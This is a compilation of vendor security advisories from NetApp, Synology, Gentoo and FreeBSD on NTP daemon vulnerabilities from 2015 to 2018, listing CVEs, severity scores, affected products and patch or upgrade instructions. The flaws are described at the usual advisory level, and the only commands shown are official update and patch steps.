=== Content from security.netapp.com_60c0e312_20250125_164250.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [April 2016 Network Time Protocol Daemon (ntpd) Vulnerabilities in Multiple NetApp Products](https://security.netapp.com/advisory/ntap-20171004-0002)

## April 2016 Network Time Protocol Daemon (ntpd) Vulnerabilities in Multiple NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20171004-0002 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20171004-0002 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20171004-0002 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20171004-0002 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20171004-0002
**Version:**
5.0

**Last updated:**
01/28/2020

**Status:**
Final.

**CVEs:** CVE-2015-7704, CVE-2016-1548, CVE-2015-8138, CVE-2016-1549, CVE-2016-2516, CVE-2016-2517, CVE-2016-2519, CVE-2016-1550, CVE-2016-1547, CVE-2016-1551, CVE-2016-2518

Overview
#### Summary

Multiple NetAppÂ® products contain the Network Time Protocol daemon (ntpd). The Open NTP project (www.ntp.org) has released a Security Notice regarding vulnerabilities that affect versions before ntp-4.2.8p7. These vulnerabilities could allow an attacker to bypass security restrictions or cause a denial of service condition.

#### Impact

Exploitation of these vulnerabilities may lead to bypassed security restrictions or a denial of service condition.

Data ONTAP operating in 7-Mode is only affected by CVE-2015-8138.

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2015-7704](https://nvd.nist.gov/vuln/detail/CVE-2015-7704) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2015-8138](https://nvd.nist.gov/vuln/detail/CVE-2015-8138) | 5.3 (MEDIUM) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N |
| [CVE-2016-1547](https://nvd.nist.gov/vuln/detail/CVE-2016-1547) | 3.7 (LOW) | CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L |
| [CVE-2016-1548](https://nvd.nist.gov/vuln/detail/CVE-2016-1548) | 7.2 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:L |
| [CVE-2016-1549](https://nvd.nist.gov/vuln/detail/CVE-2016-1549) | 5.3 (MEDIUM) | CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N |
| [CVE-2016-1550](https://nvd.nist.gov/vuln/detail/CVE-2016-1550) | 4.0 (MEDIUM) | CVSS:3.0/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N |
| [CVE-2016-1551](https://nvd.nist.gov/vuln/detail/CVE-2016-1551) | 3.7 (LOW) | CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N |
| [CVE-2016-2516](https://nvd.nist.gov/vuln/detail/CVE-2016-2516) | 4.2 (MEDIUM) | CVSS:3.0/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:H |
| [CVE-2016-2517](https://nvd.nist.gov/vuln/detail/CVE-2016-2517) | 4.2 (MEDIUM) | CVSS:3.0/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:H |
| [CVE-2016-2518](https://nvd.nist.gov/vuln/detail/CVE-2016-2518) | 2.0 (LOW) | CVSS:3.0/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:L |
| [CVE-2016-2519](https://nvd.nist.gov/vuln/detail/CVE-2016-2519) | 4.2 (MEDIUM) | CVSS:3.0/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* <http://support.ntp.org/bin/view/Main/SecurityNotice#April_2016_ntp_4_2_8p7_Security>

Affected Products
#### Affected Products

* Clustered Data ONTAP
* Data ONTAP operating in 7-Mode
* OnCommand Balance
* OnCommand Performance Manager (Unified Manager Performance Pkg)
* OnCommand Unified Manager for Clustered Data ONTAP

#### Products Not Affected

* 7-Mode Transition Tool
* ATTO FibreBridge
* Brocade Fabric Operating System Firmware
* Brocade Network Advisor Software
* Clustered Data ONTAP Antivirus Connector
* E-Series SANtricity Management Plug-ins (VMware vCenter)
* E-Series SANtricity Storage Manager
* E-Series SANtricity Web Services (REST API) for Web Services Proxy
* FAS/AFF BIOS
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp Cloud Backup (formerly AltaVault)
* NetApp Cloud Backup OST Plug-in (formerly AltaVault OST Plug-in)
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp Plug-in for Symantec NetBackup
* NetApp SANtricity SMI-S Provider
* NetApp SMI-S Provider
* NetApp Storage Encryption
* NetApp VASA Provider for Clustered Data ONTAP 7.2 and above
* OnCommand API Services
* OnCommand Cloud Manager
* OnCommand Insight
* OnCommand System Manager 9.x
* OnCommand Unified Manager for 7-Mode (core package)
* OnCommand Workflow Automation
* Open Systems SnapVault Agent
* RAID Controller CTS2600 Legacy Engenio
* Service Processor
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapDrive for Unix
* SnapDrive for Windows
* SnapManager for Exchange
* SnapManager for Hyper-V
* SnapManager for MS SQL
* SnapManager for Oracle
* SnapManager for SAP
* SnapManager for Sharepoint
* Storage Replication Adapter for Clustered Data ONTAP for VMware vSphere 7.2 and above
* Storage Services Connector
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID Webscale NAS Bridge
* StorageGRID9 (9.x and prior)
* System Setup
* Virtual Storage Console for VMware vSphere 7.2 and above

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **OnCommand Performance Manager (Unified Manager Performance Pkg)** | <http://mysupport.netapp.com/NOW/download/software/oncommand_pm/2.1P1/> <http://mysupport.netapp.com/NOW/download/software/oncommand_pm_linux/2.1P1/> |
| **Data ONTAP operating in 7-Mode** | Data ONTAP operating in 7-Mode has no plans to address this vulnerability. |
| **OnCommand Balance** | OnCommand Balance has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMP1655122.html) for more information. |
| **OnCommand Unified Manager for Clustered Data ONTAP** | <http://mysupport.netapp.com/NOW/download/software/oncommand_cdot_win/6.4P1/> <http://mysupport.netapp.com/NOW/download/software/oncommand_cdot_lin/6.4P1/> <http://mysupport.netapp.com/NOW/download/software/oncommand_cdot/6.4P1/> |
| **Clustered Data ONTAP** | <https://mysupport.netapp.com/NOW/download/software/ontap/9.1/> |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20171004-0002>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20171004 | Initial Public Release |
| 2.0 | 20171020 | After additional review, NetApp VASA Provider for Clustered Data ONTAP moved from Affected Products to Products Not Affected |
| 3.0 | 20171129 | Clustered Data ONTAP added to Software Versions and Fixes |
| 4.0 | 20180122 | OnCommand Balance moved to Won't Fix status, Final status |
| 5.0 | 20200128 | Impact is updated for Data ONTAP operating in 7-Mode |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from www.synology.com_b9141d1f_20250125_164252.html ===


* [Security Advisory](security/advisory)
# Synology-SA-18:13 NTP

Publish Time: 2018-03-27 15:57:38 UTC+8

Last Updated: 2018-04-10 16:29:05 UTC+8

Severity
Moderate

Status
Resolved

**Abstract**

These vulnerabilities allow remote attackers to conduct association attacks via a susceptible version of Synology DiskStation Manager (DSM), Synology Router Manager (SRM), Virtual DSM, SkyNAS or VS960HD.

**Affected Products**

| Product | Severity | Fixed Release Availability |
| --- | --- | --- |
| DSM 6.1 | Moderate | Upgrade to 6.1.6-15266 or above. |
| DSM 6.0 | Moderate | Upgrade to 6.1.6-15266 or above. |
| DSM 5.2 | Moderate | Upgrade to 6.1.6-15266 or above. |
| SRM 1.1 | Moderate | Upgrade to 1.1.6-6931-3 or above. |
| Virtual DSM | Moderate | Upgrade to 6.1.6-15266 or above. |
| SkyNAS | Moderate | Upgrade to 6.1.5-15254 or above. |
| VS960HD | Moderate | Upgrade to 2.2.3-1505 or above. |

**Mitigation**

None

**Detail**

* CVE-2018-7185

  + Severity: Low
  + CVSS3 Base Score: 3.1
  + CVSS3 Vector: [CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L)
  + The protocol engine in ntp 4.2.6 before 4.2.8p11 allows a remote attackers to cause a denial of service (disruption) by continually sending a packet with a zero-origin timestamp and source IP address of the "other side" of an interleaved association causing the victim ntpd to reset its association.
* CVE-2018-7184

  + Severity: Low
  + CVSS3 Base Score: 3.1
  + CVSS3 Vector: [CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L)
  + ntpd in ntp 4.2.8p4 before 4.2.8p11 drops bad packets before updating the "received" timestamp, which allows remote attackers to cause a denial of service (disruption) by sending a packet with a zero-origin timestamp causing the association to reset and setting the contents of the packet as the most recent timestamp. This issue is a result of an incomplete fix for CVE-2015-7704.
* CVE-2018-7170

  + Severity: Low
  + CVSS3 Base Score: 3.1
  + CVSS3 Vector: [CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N)
  + ntpd in ntp 4.2.x before 4.2.8p7 and 4.3.x before 4.3.92 allows authenticated users that know the private symmetric key to create arbitrarily-many ephemeral associations in order to win the clock selection of ntpd and modify a victim's clock via a Sybil attack. This issue exists because of an incomplete fix for CVE-2016-1549.
* CVE-2018-7183

  + Severity: Moderate
  + CVSS3 Base Score: 5.0
  + CVSS3 Vector: [CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)
  + Buffer overflow in the decodearr function in ntpq in ntp 4.2.8p6 through 4.2.8p10 allows remote attackers to execute arbitrary code by leveraging an ntpq query and sending a response with a crafted array.
* CVE-2018-7182

  + Severity: Moderate
  + CVSS3 Base Score: 5.3
  + CVSS3 Vector: [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
  + The ctl\_getitem method in ntpd in ntp-4.2.8p6 before 4.2.8p11 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted mode 6 packet with a ntpd instance from 4.2.8p6 through 4.2.8p10.
* CVE-2016-1549

  + Severity: Moderate
  + CVSS3 Base Score: 5.3
  + CVSS3 Vector: [CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N)
  + A malicious authenticated peer can create arbitrarily-many ephemeral associations in order to win the clock selection algorithm in ntpd in NTP 4.2.8p4 and earlier and NTPsec 3e160db8dc248a0bcb053b56a80167dc742d2b74 and a5fb34b9cc89b92a8fef2f459004865c93bb7f92 and modify a victim's clock.

**Reference**

* [February 2018 ntp-4.2.8p11 NTP Security Vulnerability Announcement](https://support.ntp.org/bin/view/Main/SecurityNotice#February_2018_ntp_4_2_8p11_NTP_S)
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1549>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7170>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7182>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7183>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7184>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7185>

**Revision**

| Revision | Date | Description |
| --- | --- | --- |
| 1 | 2018-03-27 | Initial public release. |
| 2 | 2018-03-29 | Update for SkyNAS is now available in Affected Products. |
| 3 | 2018-04-10 | Update for VS960HD is now available in Affected Products. |

## What can we do for you?

[![NAS Selector icon](img/footer/2019/footer_icon_nas_selector_home.png)

NAS Selector](support/nas_selector "Navigate to NAS Selector in homepage")

[![RAID Calculator icon](img/footer/2019/footer_icon_raid_calculator_home.png)

RAID Calculator](support/RAID_calculator "Navigate to RAID Calculator in homepage")

[![NVR Selector icon](img/footer/2019/footer_icon_nvr_selector_home.png)

NVR Selector](support/nvr_selector "Navigate to NVR Selector in homepage")

[![Knowledge Center icon](img/footer/2019/footer_icon_knowledge_base_home.png)

Knowledge Center](https://kb.synology.com/en-global/ "Navigate to Knowledge Center in homepage")

[![Downloads icon](img/footer/2019/footer_icon_downloads_home.png)

Downloads](support/download "Navigate to Downloads in homepage")

[![Newsletter icon](img/footer/2019/footer_icon_newsletter_home.png)

Newsletter](/subscribe-newsletter "Navigate to Newsletter in homepage")

[![NAS Selector icon](img/footer/2019/footer_icon_nas_selector.png)

NAS Selector](support/nas_selector "Navigate to NAS Selector")

[![RAID Calculator icon](img/footer/2019/footer_icon_raid_calculator.png)

RAID Calculator](support/RAID_calculator "Navigate to RAID Calculator")

[![NVR Selector icon](img/footer/2019/footer_icon_nvr_selector.png)

NVR Selector](support/nvr_selector "Navigate to NVR Selector")

[![Knowledge Center icon](img/footer/2019/footer_icon_knowledge_base.png)

Knowledge Center](https://kb.synology.com/en-global/ "Navigate to Knowledge Center")

[![Downloads icon](img/footer/2019/footer_icon_downloads.png)

Downloads](support/download "Navigate to Downloads")

[![Newsletter icon](img/footer/2019/footer_icon_newsletter.png)

Newsletter](/subscribe-newsletter "Navigate to Newsletter")

Company

* [About Synology](company)
* [Blog](https://blog.synology.com/)
* [Newsroom](company/news)
* [Media Coverage](company/reviews)
* [Customer Stories](company/case_study)
* [Office Locations](company/office_location)
* [ESG](company/esg)

Sales

* [Where to Buy](wheretobuy)
* [Contact Us](company/contact_us)
* [Become a Partner](/form/inquiry/sales)

Compatibility

* [HDD/SSD](compatibility?search_by=drives)
* [IP Cameras](compatibility/camera)
* [Network Cards](compatibility?search_by=category&category=network_interface_cards&p=1)
* [I/O Modules, IP Speakers, Access Controllers](compatibility/surveillance_devices)
* [Other Devices](compatibility?search_by=category)

Resources

* [Products A-Z](products-a-z)
* [Beta Program](beta)
* [Bounty Program](security/bounty_program)
* [Community](https://community.synology.com/enu)
* [Events](https://event.synology.com/en-global)
* [Subscribe to Newsletter](/subscribe-newsletter)

Copyright © 2025 Synology Inc. All rights reserved.
[Terms & Conditions](company/legal/terms_conditions "Terms & Conditions")
| [Privacy](company/legal/privacy "Privacy")
| Cookie Preference

 Global - English

Continue



=== Content from support.hpe.com_589ab356_20250125_164251.html ===




=== Content from security.gentoo.org_7a9148c9_20250125_164249.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# NTP: Multiple vulnerabilities — GLSA **201607-15**

Multiple vulnerabilities have been found in NTP, the worst of which
could lead to Denial of Service.

### Affected packages

| Package | **net-misc/ntp** on all architectures |
| --- | --- |
| Affected versions | < **4.2.8\_p8** |
| Unaffected versions | >= **4.2.8\_p8** |

### Background

NTP contains software for the Network Time Protocol.

### Description

Multiple vulnerabilities have been discovered in NTP. Please review the
CVE identifiers referenced below for details.

### Impact

A remote attacker could possibly cause a Denial of Service condition.

### Workaround

There is no known workaround at this time.

### Resolution

All NTP users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-misc/ntp-4.2.8_p8"

```
### References

* [CVE-2015-7691](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7691)
* [CVE-2015-7692](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7692)
* [CVE-2015-7701](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7701)
* [CVE-2015-7702](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7702)
* [CVE-2015-7703](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7703)
* [CVE-2015-7704](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7704)
* [CVE-2015-7705](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7705)
* [CVE-2015-7848](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7848)
* [CVE-2015-7849](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7849)
* [CVE-2015-7850](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7850)
* [CVE-2015-7851](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7851)
* [CVE-2015-7852](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7852)
* [CVE-2015-7853](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7853)
* [CVE-2015-7854](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7854)
* [CVE-2015-7855](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7855)
* [CVE-2015-7871](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7871)
* [CVE-2015-7973](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7973)
* [CVE-2015-7974](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7974)
* [CVE-2015-7975](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7975)
* [CVE-2015-7976](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7976)
* [CVE-2015-7977](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7977)
* [CVE-2015-7978](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7978)
* [CVE-2015-7979](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7979)
* [CVE-2015-8138](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-8138)
* [CVE-2015-8139](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-8139)
* [CVE-2015-8140](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-8140)
* [CVE-2015-8158](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-8158)
* [CVE-2016-1547](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-1547)
* [CVE-2016-1548](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-1548)
* [CVE-2016-1549](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-1549)
* [CVE-2016-1550](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-1550)
* [CVE-2016-1551](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-1551)
* [CVE-2016-2516](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-2516)
* [CVE-2016-2517](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-2517)
* [CVE-2016-2518](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-2518)
* [CVE-2016-2519](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-2519)
* [CVE-2016-4953](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-4953)
* [CVE-2016-4954](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-4954)
* [CVE-2016-4955](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-4955)
* [CVE-2016-4956](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-4956)
* [CVE-2016-4957](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-4957)

**Release date**

July 20, 2016

**Latest revision**

July 20, 2016: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [563774](https://bugs.gentoo.org/show_bug.cgi?id=563774)
* [572452](https://bugs.gentoo.org/show_bug.cgi?id=572452)
* [581528](https://bugs.gentoo.org/show_bug.cgi?id=581528)
* [584954](https://bugs.gentoo.org/show_bug.cgi?id=584954)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from security.FreeBSD.org_83b44072_20250125_164249.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
=============================================================================
FreeBSD-SA-16:16.ntp Security Advisory
The FreeBSD Project
Topic: Multiple vulnerabilities of ntp
Category: contrib
Module: ntp
Announced: 2016-04-29
Credits: Network Time Foundation and various contributors listed below
Affects: All supported versions of FreeBSD.
Corrected: 2016-04-27 15:24:33 UTC (stable/10, 10.3-STABLE)
2016-04-29 08:02:31 UTC (releng/10.3, 10.3-RELEASE-p1)
2016-04-29 08:02:31 UTC (releng/10.2, 10.2-RELEASE-p15)
2016-04-29 08:02:31 UTC (releng/10.1, 10.1-RELEASE-p32)
2016-04-27 15:25:18 UTC (stable/9, 9.3-STABLE)
2016-04-29 08:02:31 UTC (releng/9.3, 9.3-RELEASE-p40)
CVE Name: CVE-2016-1547, CVE-2016-1548, CVE-2016-1549, CVE-2016-1550,
CVE-2016-1551, CVE-2016-2516, CVE-2016-2517, CVE-2016-2518,
CVE-2016-2519
For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit .
I. Background
The ntpd(8) daemon is an implementation of the Network Time Protocol (NTP)
used to synchronize the time of a computer system to a reference time
source.
II. Problem Description
Multiple vulnerabilities have been discovered in the NTP suite:
On OSes (FreeBSD not affected) that allows packets claiming to be from
127.0.0.0/8 that arrive over physical network, if ntpd is configured to use
a reference clock, an attacker can inject packets over the network that look
like they are coming from that reference clock. [CVE-2016-1551, Reported by
Matt Street and others of Cisco ASIG]
If a system is set up to use a trustedkey, and if one is not using the
feature introduced in ntp-4.2.8p6 allowing an optional 4th field in the
ntp.keys file to specify which IPs can serve time, a malicious
authenticated peer -- i.e. one where the attacker knows the private
symmetric key -- can create arbitrarily-many ephemeral associations in
order to win the clock selection of ntpd and modify a victim's clock.
[CVE-2016-1549, Reported by Matthew Van Gundy of Cisco ASIG]
If ntpd was expressly configured to allow for remote configuration (this is
not common), a malicious user who knows the controlkey for ntpq or the
requestkey for ntpdc (if mode7 is expressly enabled) can create a session
with ntpd and if an existing association is unconfigured using the same IP
twice on the unconfig directive line, ntpd will abort. [CVE-2016-2516,
Reported by Yihan Lian of the Cloud Security Team, Qihoo 360]
If ntpd was expressly configured to allow for remote configuration (this is
not common), a malicious user who knows the controlkey for ntpq or the
requestkey for ntpdc (if mode7 is expressly enabled) can create a session
with ntpd and then send a crafted packet to ntpd that will change the value
of the trustedkey, controlkey, or requestkey to a value that will prevent
any subsequent authentication with ntpd until ntpd is restarted.
[CVE-2016-2517, Reported by Yihan Lian of the Cloud Security Team, Qihoo 360]
Using a crafted packet to create a peer association with hmode > 7 causes
the MATCH\_ASSOC() lookup to make an out-of-bounds reference. [CVE-2016-2518,
Reported by Yihan Lian of the Cloud Security Team, Qihoo 360]
ntpq and ntpdc can be used to store and retrieve information in ntpd. It is
possible to store a data value that is larger than the size of the buffer
that the ctl\_getitem() function of ntpd uses to report the return value.
If the length of the requested data value returned by ctl\_getitem() is too
large, the value NULL is returned instead. There are 2 cases where the return
value from ctl\_getitem() was not directly checked to make sure it's not NULL,
but there are subsequent INSIST() checks that make sure the return value is
not NULL. There are no data values ordinarily stored in ntpd that would
exceed this buffer length. But if one has permission to store values and
one stores a value that is "too large", then ntpd will abort if an attempt
is made to read that oversized value. [CVE-2016-2519, Reported by
Yihan Lian of the Cloud Security Team, Qihoo 360]
For ntp-4 versions up to but not including ntp-4.2.8p7, an off-path attacker
can cause a preemptable client association to be demobilized by sending a
crypto NAK packet to a victim client with a spoofed source address of an
existing associated peer. This is true even if authentication is enabled.
Furthermore, if the attacker keeps sending crypto NAK packets, for example
one every second, the victim never has a chance to reestablish the
association and synchronize time with that legitimate server. For ntp-4.2.8
up to ntp-4.2.8p6 there is less risk because more stringent checks are
performed on incoming packets, but there are still ways to exploit this
vulnerability in versions before ntp-4.2.8p7. [CVE-2016-1547, Reported by
Stephen Gray and Matthew Van Gundy of Cisco ASIG]
It is possible to change the time of an ntpd client or deny service to an
ntpd client by forcing it to change from basic client/server mode to
interleaved symmetric mode. An attacker can spoof a packet from a legitimate
ntpd server with an origin timestamp that matches the peer->dst timestamp
recorded for that server. After making this switch, the client will reject
all future legitimate server responses. It is possible to force the victim
client to move time after the mode has been changed. ntpq gives no
indication that the mode has been switched. [CVE-2016-1548, Reported by
Miroslav Lichvar of RedHat and separately by Jonathan Gardner of
Cisco ASIG]
Packet authentication tests have been performed using memcmp() or possibly
bcmp(), and it is potentially possible for a local or perhaps LAN-based
attacker to send a packet with an authentication payload and indirectly
observe how much of the digest has matched. [CVE-2016-1550, Reported
independently by Loganaden Velvindron, and Matthew Van Gundy and
Stephen Gray of Cisco ASIG]
III. Impact
Malicious remote attackers may be able to break time synchornization,
or cause the ntpd(8) daemon to crash.
IV. Workaround
No workaround is available, but systems not running ntpd(8) are not
affected. Network administrators are advised to implement BCP-38,
which helps to reduce risk associated with the attacks.
V. Solution
Perform one of the following:
1) Upgrade your vulnerable system to a supported FreeBSD stable or
release / security branch (releng) dated after the correction date.
The ntpd service has to be restarted after the update. A reboot is
recommended but not required.
2) To update your vulnerable system via a binary patch:
Systems running a RELEASE version of FreeBSD on the i386 or amd64
platforms can be updated via the freebsd-update(8) utility:
# freebsd-update fetch
# freebsd-update install
The ntpd service has to be restarted after the update. A reboot is
recommended but not required.
3) To update your vulnerable system via a source code patch:
The following patches have been verified to apply to the applicable
FreeBSD release branches.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
# fetch https://security.FreeBSD.org/patches/SA-16:16/ntp.patch
# fetch https://security.FreeBSD.org/patches/SA-16:16/ntp.patch.asc
# gpg --verify ntp.patch.asc
b) Apply the patch. Execute the following commands as root:
# cd /usr/src
# patch < /path/to/patch
c) Recompile the operating system using buildworld and installworld as
described in .
Restart the applicable daemons, or reboot the system.
VI. Correction details
The following list contains the correction revision numbers for each
affected branch.
Branch/path Revision
- -------------------------------------------------------------------------
stable/9/ r298700
releng/9.3/ r298770
stable/10/ r298699
releng/10.1/ r298770
releng/10.2/ r298770
releng/10.3/ r298770
- -------------------------------------------------------------------------
To see which files were modified by a particular revision, run the
following command, replacing NNNNNN with the revision number, on a
machine with Subversion installed:
# svn diff -cNNNNNN --summarize svn://svn.freebsd.org/base
Or visit the following URL, replacing NNNNNN with the revision number:
VII. References
The latest revision of this advisory is available at
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.1.11 (FreeBSD)
iQIcBAEBCgAGBQJXIxXiAAoJEO1n7NZdz2rnAXgP/0OzpMmgCt4H9ldywUWaFmtr
